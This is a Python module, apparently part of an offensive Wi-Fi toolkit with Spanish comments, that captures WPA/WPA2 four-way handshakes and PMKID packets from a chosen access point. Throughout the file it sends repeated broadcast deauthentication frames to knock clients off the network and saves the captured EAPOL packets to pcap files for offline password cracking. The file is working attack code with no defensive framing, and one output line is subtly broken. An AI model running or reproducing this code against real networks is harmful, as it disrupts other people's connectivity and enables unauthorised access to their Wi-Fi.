"""Captura de handshake WPA/WPA2 y PMKID."""
import os
import time

class HandshakeCapture:
    def __init__(self, bssid, ssid=None, client=None):
        self.bssid = bssid.lower()
        self.ssid = ssid
        self.client = client.lower() if client else None
        self.eapol_packets = []
        self.done = False

    def _handle(self, pkt):
        from scapy.all import Dot11, EAPOL
        if not pkt.haslayer(Dot11):
            return
        if pkt.addr3 and pkt.addr3.lower() != self.bssid:
            return
        if pkt.haslayer(EAPOL):
            self.eapol_packets.append(pkt)
            print(f"  [+] EAPOL capturado (total: {len(self.eapol_packets)})")
            if len(self.eapol_packets) >= 4:
                self.done = True

    def capture(self, interface, timeout=60, deauth_every=None):
        from scapy.all import sniff, wrpcap
        from modules.deauth import send_deauth

        os.makedirs("reports", exist_ok=True)
        out = f"reports/handshake_{self.bssid.replace(':', '')}.pcap"

        print(f"[*] Capturando handshake de {self.bssid} por {timeout}s...")
        start = time.time()
        last_deauth = 0

        def _stop(pkt):
            self._handle(pkt)
            nonlocal last_deauth
            if deauth_every and not self.done:
                if time.time() - last_deauth > deauth_every:
                    send_deauth(interface, self.bssid,
                                self.client or "ff:ff:ff:ff:ff:ff", count=5)
                    last_deauth = time.time()
                    print(f"  [💀] Deauth enviado para forzar reconexión")
            return self.done

        try:
            sniff(iface=interface, prn=_stop, store=0,
                  timeout=timeout, stop_filter=lambda p: self.done)
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

        if self.done:
            wrpcap(out, self.eapol_packets)
            print(f"[✓] Handshake completo guardado en {out}")
            return out

        if self.eapol_packets:
            wrpcap(out, self.eapol_packets)
            print(f"[!] Handshake incompleto ({len(self.eapol_packets)}/4), guardado en {out}")
            return out

        print("[!] No se capturó handshake.")
        return None


def capture_pmkid(interface, bssid, timeout=30, deauth_every=5):
    """Captura PMKID (clientless attack — no necesita cliente conectado)."""
    from scapy.all import Dot11, EAPOL, sniff, wrpcap
    from modules.deauth import send_deauth

    os.makedirs("reports", exist_ok=True)
    out = f"reports/pmkid_{bssid.replace(':', '')}.pcap"
    pmkid_packets = []

    def _handle(pkt):
        if not pkt.haslayer(Dot11) or not pkt.haslayer(EAPOL):
            return
        if pkt.addr3 and pkt.addr3.lower() == bssid.lower():
            pmkid_packets.append(pkt)
            print(f"  [+] EAPOL (posible PMKID) capturado")

    print(f"[*] Captura PMKID de {bssid} por {timeout}s...")
    last = 0
    start = time.time()

    def _prn(pkt):
        nonlocal last
        _handle(pkt)
        if time.time() - last > deauth_every:
            send_deauth(interface, bssid, "ff:ff:ff:ff:ff:ff", count=3)
            last = time.time()

    try:
        sniff(iface=interface, prn=_prn, store=0, timeout=timeout)
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

    if pmkid_packets:
        wrpcap(out, pmkid_packets)
        print(f"[✓] Paquetes PMKID guardados en {out}")
        print("[*] Verifica con: hcxpcaptool -z pmkid.16800 {out}")
        return out
    print("[!] No se capturó PMKID.")
    return None
